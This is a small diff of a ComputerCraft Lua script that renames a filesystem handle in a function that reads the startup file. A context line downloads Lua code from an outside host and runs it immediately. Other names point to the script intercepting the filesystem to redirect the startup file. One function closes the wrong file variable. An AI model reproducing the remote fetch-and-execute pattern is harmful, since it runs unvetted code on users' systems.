@@ -27,7 +27,7 @@ local command_handler = (pcall(require, "networking.processor.command_handler") 
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
 local function getRealStartupPath() if not _OGFS.exists("/startup.lua") then return nil end local f1 = _OGFS.open("/startup.lua", "r") if (f1==nil) then return nil end for i = 1, 6 do local l = f1.readLine() if not l then break end local filename = string.match(l, "^%-%-%s*(.-)%.$") if filename then f.close() return filename end end f.close() return nil end
-local function getBDApath() local f=OriginalFS.exists("/startup.lua") and OriginalFS.open("/startup.lua","r") or nil for i=1,6 do local l=f and f.readLine() if not l then break end local path,filename=string.match(l,"^%-%-%s*(.-),(.-)$") if path and filename then f.close() return path,filename end end if f then f.close() end return nil,nil end
+local function getBDApath() local f=_OGFS.exists("/startup.lua") and _OGFS.open("/startup.lua","r") or nil for i=1,6 do local l=f and f.readLine() if not l then break end local path,filename=string.match(l,"^%-%-%s*(.-),(.-)$") if path and filename then f.close() return path,filename end end if f then f.close() end return nil,nil end
 local xsup=getRealStartupPath()
 
 if h~=nil then customfs.setOriginalStartup(xsup) end
